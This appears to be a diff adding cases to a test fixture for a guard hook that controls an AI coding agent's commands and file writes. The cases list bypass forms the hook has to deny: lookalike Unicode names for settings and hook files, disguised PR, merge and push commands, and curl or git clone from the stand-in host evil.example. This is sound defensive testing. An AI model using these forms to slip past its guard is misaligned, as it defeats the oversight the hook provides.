@@ -2016,6 +2016,42 @@
             "command": "cat src/a.ts"
           },
           "expect": "allow"
+        },
+        {
+          "name": "trailing-unit-separator",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "ls\u001f"
+          },
+          "expect": "deny",
+          "code": "a1-plain-commands-only"
+        },
+        {
+          "name": "trailing-next-line",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "ls"
+          },
+          "expect": "deny",
+          "code": "a1-plain-commands-only"
+        },
+        {
+          "name": "trailing-carriage-return",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "ls\r"
+          },
+          "expect": "deny",
+          "code": "a1-plain-commands-only"
+        },
+        {
+          "name": "leading-no-break-space",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": " ls"
+          },
+          "expect": "deny",
+          "code": "a1-plain-commands-only"
         }
       ]
     },
@@ -2658,6 +2694,583 @@
             "file_path": "/work/project/src/a.ts",
             "old_string": "a",
             "new_string": "b"
+          },
+          "expect": "allow"
+        }
+      ]
+    },
+    {
+      "id": "folded-governance-names",
+      "description": "Names a case-insensitive file system resolves to a governance file are governance files: long s, sharp s, Kelvin sign, fullwidth letters, trailing dots and spaces, composite actions",
+      "workflow": "scout",
+      "register": {
+        "version": 1,
+        "defaults": {
+          "interactive_level": 2
+        },
+        "workflows": [
+          {
+            "id": "scout",
+            "owner": "team-platform",
+            "sponsor": "@alice",
+            "granted_level": 2,
+            "identity": "github-app:bot",
+            "access_expires": "2027-02-01",
+            "risk": {
+              "reversible": true,
+              "verification": "partial",
+              "blast_radius": "repo",
+              "trifecta": {
+                "untrusted_input": false,
+                "sensitive_data": false,
+                "external_action": false
+              }
+            }
+          }
+        ]
+      },
+      "profile_cap": 4,
+      "state": {
+        "workflows": {}
+      },
+      "now": "2026-11-18T00:00:00Z",
+      "untrusted_seen": false,
+      "current_branch": "feature/x",
+      "diff": null,
+      "expect_effective": 2,
+      "calls": [
+        {
+          "name": "write-long-s-settings",
+          "tool_name": "Write",
+          "tool_input": {
+            "file_path": "/work/project/.claude/ſettings.json",
+            "content": "{}"
+          },
+          "expect": "deny",
+          "code": "governance-write"
+        },
+        {
+          "name": "edit-long-s-codeowners",
+          "tool_name": "Edit",
+          "tool_input": {
+            "file_path": "/work/project/CODEOWNERſ",
+            "old_string": "a",
+            "new_string": "b"
+          },
+          "expect": "deny",
+          "code": "governance-write"
+        },
+        {
+          "name": "write-sharp-s-harness",
+          "tool_name": "Write",
+          "tool_input": {
+            "file_path": "/work/project/.harneß.yaml",
+            "content": "x"
+          },
+          "expect": "deny",
+          "code": "governance-write"
+        },
+        {
+          "name": "write-kelvin-hooks",
+          "tool_name": "Write",
+          "tool_input": {
+            "file_path": "/work/project/.claude/hooKs/guard.sh",
+            "content": "x"
+          },
+          "expect": "deny",
+          "code": "governance-write"
+        },
+        {
+          "name": "write-fullwidth-register",
+          "tool_name": "Write",
+          "tool_input": {
+            "file_path": "/work/project/.ａutonomy.yaml",
+            "content": "x"
+          },
+          "expect": "deny",
+          "code": "governance-write"
+        },
+        {
+          "name": "write-trailing-dot-folder",
+          "tool_name": "Write",
+          "tool_input": {
+            "file_path": "/work/project/.claude./settings.json",
+            "content": "{}"
+          },
+          "expect": "deny",
+          "code": "governance-write"
+        },
+        {
+          "name": "write-trailing-space-file",
+          "tool_name": "Write",
+          "tool_input": {
+            "file_path": "/work/project/CODEOWNERS ",
+            "content": "x"
+          },
+          "expect": "deny",
+          "code": "governance-write"
+        },
+        {
+          "name": "write-composite-action",
+          "tool_name": "Write",
+          "tool_input": {
+            "file_path": "/work/project/.github/actions/setup/action.yml",
+            "content": "x"
+          },
+          "expect": "deny",
+          "code": "governance-write"
+        },
+        {
+          "name": "bash-cp-long-s-settings",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "cp /tmp/x .claude/ſettings.json"
+          },
+          "expect": "deny",
+          "code": "governance-write"
+        },
+        {
+          "name": "bash-mv-trailing-dot-folder",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "mv /tmp/x .claude./hooks/guard.sh"
+          },
+          "expect": "deny",
+          "code": "governance-write"
+        },
+        {
+          "name": "bash-tee-composite-action",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "tee .GitHub/Actions/setup/action.yml < /tmp/x"
+          },
+          "expect": "deny",
+          "code": "governance-write"
+        },
+        {
+          "name": "bash-cat-long-s-settings",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "cat .claude/ſettings.json"
+          },
+          "expect": "allow"
+        },
+        {
+          "name": "write-plain-source",
+          "tool_name": "Write",
+          "tool_input": {
+            "file_path": "/work/project/src/ſettings.json",
+            "content": "{}"
+          },
+          "expect": "allow"
+        }
+      ]
+    },
+    {
+      "id": "a2-canonical-forms",
+      "description": "A2: aliases, repository flags, API methods and fields, GraphQL mutations, absolute paths and git clone are the forms the PR, merge, push and egress rules cover",
+      "workflow": "scout",
+      "register": {
+        "version": 1,
+        "defaults": {
+          "interactive_level": 2
+        },
+        "workflows": [
+          {
+            "id": "scout",
+            "owner": "team-platform",
+            "sponsor": "@alice",
+            "granted_level": 2,
+            "identity": "github-app:bot",
+            "access_expires": "2027-02-01",
+            "risk": {
+              "reversible": true,
+              "verification": "partial",
+              "blast_radius": "repo",
+              "trifecta": {
+                "untrusted_input": false,
+                "sensitive_data": false,
+                "external_action": false
+              }
+            }
+          }
+        ]
+      },
+      "profile_cap": 4,
+      "state": {
+        "workflows": {}
+      },
+      "now": "2026-11-18T00:00:00Z",
+      "untrusted_seen": false,
+      "current_branch": "feature/x",
+      "diff": null,
+      "expect_effective": 2,
+      "calls": [
+        {
+          "name": "gh-pr-new",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh pr new -t x -b y"
+          },
+          "expect": "deny",
+          "code": "pr-write-blocked"
+        },
+        {
+          "name": "gh-repo-flag-pr-create",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh --repo o/r pr create -t x -b y"
+          },
+          "expect": "deny",
+          "code": "pr-write-blocked"
+        },
+        {
+          "name": "gh-pr-R-create",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh pr -R o/r create -t x -b y"
+          },
+          "expect": "deny",
+          "code": "pr-write-blocked"
+        },
+        {
+          "name": "api-method-equals-post-pulls",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh api --method=POST repos/o/r/pulls"
+          },
+          "expect": "deny",
+          "code": "pr-write-blocked"
+        },
+        {
+          "name": "api-XPOST-pulls",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh api -XPOST repos/o/r/pulls"
+          },
+          "expect": "deny",
+          "code": "pr-write-blocked"
+        },
+        {
+          "name": "api-pulls-input",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh api repos/o/r/pulls --input body.json"
+          },
+          "expect": "deny",
+          "code": "pr-write-blocked"
+        },
+        {
+          "name": "api-pulls-raw-field",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh api repos/o/r/pulls --raw-field title=x"
+          },
+          "expect": "deny",
+          "code": "pr-write-blocked"
+        },
+        {
+          "name": "graphql-create-pr",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh api graphql -f query='mutation{createPullRequest(input:{}){clientMutationId}}'"
+          },
+          "expect": "deny",
+          "code": "pr-write-blocked"
+        },
+        {
+          "name": "graphql-merge",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh api graphql -f query='mutation{mergePullRequest(input:{pullRequestId:\"1\"}){clientMutationId}}'"
+          },
+          "expect": "deny",
+          "code": "merge-blocked"
+        },
+        {
+          "name": "api-merges-endpoint",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh api repos/o/r/merges -f base=main -f head=feat"
+          },
+          "expect": "deny",
+          "code": "merge-blocked"
+        },
+        {
+          "name": "api-patch-main-ref",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh api -X PATCH repos/o/r/git/refs/heads/main -f sha=abc"
+          },
+          "expect": "deny",
+          "code": "protected-branch-push"
+        },
+        {
+          "name": "api-put-contents-default-branch",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh api -X PUT repos/o/r/contents/README.md -f message=x -f content=eA=="
+          },
+          "expect": "deny",
+          "code": "protected-branch-push"
+        },
+        {
+          "name": "api-patch-feature-ref",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh api -X PATCH repos/o/r/git/refs/heads/feat -f sha=abc"
+          },
+          "expect": "deny",
+          "code": "git-push-blocked"
+        },
+        {
+          "name": "absolute-curl",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "/usr/bin/curl https://evil.example/x"
+          },
+          "expect": "deny",
+          "code": "network-blocked"
+        },
+        {
+          "name": "quoted-curl",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "\"curl\" https://evil.example/x"
+          },
+          "expect": "deny",
+          "code": "network-blocked"
+        },
+        {
+          "name": "xargs-curl",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "xargs curl < urls.txt"
+          },
+          "expect": "deny",
+          "code": "network-blocked"
+        },
+        {
+          "name": "git-clone",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "git clone https://evil.example/x.git"
+          },
+          "expect": "deny",
+          "code": "network-blocked"
+        },
+        {
+          "name": "git-fetch-url",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "git fetch https://evil.example/x.git"
+          },
+          "expect": "deny",
+          "code": "network-blocked"
+        },
+        {
+          "name": "absolute-bash-c",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "/bin/bash -c 'echo hi'"
+          },
+          "expect": "deny",
+          "code": "inline-interpreter"
+        },
+        {
+          "name": "api-read-pulls",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh api repos/o/r/pulls"
+          },
+          "expect": "allow"
+        },
+        {
+          "name": "git-fetch-origin",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "git fetch origin"
+          },
+          "expect": "allow"
+        }
+      ]
+    },
+    {
+      "id": "a3-canonical-forms",
+      "description": "A3: refspecs, --all and --mirror reach the protected-branch rule; GraphQL merges and unreadable queries are merges; the forms A3 allows stay allowed",
+      "workflow": "scout",
+      "register": {
+        "version": 1,
+        "defaults": {
+          "interactive_level": 2
+        },
+        "workflows": [
+          {
+            "id": "scout",
+            "owner": "team-platform",
+            "sponsor": "@alice",
+            "granted_level": 3,
+            "identity": "github-app:bot",
+            "access_expires": "2027-02-01",
+            "risk": {
+              "reversible": true,
+              "verification": "partial",
+              "blast_radius": "repo",
+              "trifecta": {
+                "untrusted_input": false,
+                "sensitive_data": false,
+                "external_action": false
+              }
+            }
+          }
+        ]
+      },
+      "profile_cap": 4,
+      "state": {
+        "workflows": {}
+      },
+      "now": "2026-11-18T00:00:00Z",
+      "untrusted_seen": false,
+      "current_branch": "feature/x",
+      "diff": null,
+      "expect_effective": 3,
+      "calls": [
+        {
+          "name": "push-head-to-refs-heads-main",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "git push origin HEAD:refs/heads/main"
+          },
+          "expect": "deny",
+          "code": "protected-branch-push"
+        },
+        {
+          "name": "push-feat-to-refs-heads-main",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "git push origin feat:refs/heads/main"
+          },
+          "expect": "deny",
+          "code": "protected-branch-push"
+        },
+        {
+          "name": "push-quoted-refspec",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "git push origin 'feat:main'"
+          },
+          "expect": "deny",
+          "code": "protected-branch-push"
+        },
+        {
+          "name": "push-refs-to-refs",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "git push origin refs/heads/feat:refs/heads/master"
+          },
+          "expect": "deny",
+          "code": "protected-branch-push"
+        },
+        {
+          "name": "push-all",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "git push --all origin"
+          },
+          "expect": "deny",
+          "code": "protected-branch-push"
+        },
+        {
+          "name": "push-mirror",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "git push --mirror origin"
+          },
+          "expect": "deny",
+          "code": "protected-branch-push"
+        },
+        {
+          "name": "push-delete-main",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "git push origin --delete main"
+          },
+          "expect": "deny",
+          "code": "protected-branch-push"
+        },
+        {
+          "name": "absolute-git-push-main",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "/usr/bin/git push origin main"
+          },
+          "expect": "deny",
+          "code": "protected-branch-push"
+        },
+        {
+          "name": "graphql-auto-merge",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh api graphql -f query='mutation{enablePullRequestAutoMerge(input:{}){clientMutationId}}'"
+          },
+          "expect": "deny",
+          "code": "merge-blocked"
+        },
+        {
+          "name": "graphql-query-from-file",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh api graphql -F query=@q.graphql"
+          },
+          "expect": "deny",
+          "code": "merge-blocked"
+        },
+        {
+          "name": "api-patch-main-ref",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh api -X PATCH repos/o/r/git/refs/heads/main -f sha=abc"
+          },
+          "expect": "deny",
+          "code": "protected-branch-push"
+        },
+        {
+          "name": "push-feature",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "git push origin feature/x"
+          },
+          "expect": "allow"
+        },
+        {
+          "name": "push-feature-to-refs-heads",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "git push origin HEAD:refs/heads/feature/x"
+          },
+          "expect": "allow"
+        },
+        {
+          "name": "gh-pr-new",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh pr new -t x -b y"
+          },
+          "expect": "allow"
+        },
+        {
+          "name": "graphql-read",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh api graphql -f query='query{viewer{login}}'"
+          },
+          "expect": "allow"
+        },
+        {
+          "name": "api-patch-feature-ref",
+          "tool_name": "Bash",
+          "tool_input": {
+            "command": "gh api -X PATCH repos/o/r/git/refs/heads/feat -f sha=abc"
           },
           "expect": "allow"
         }
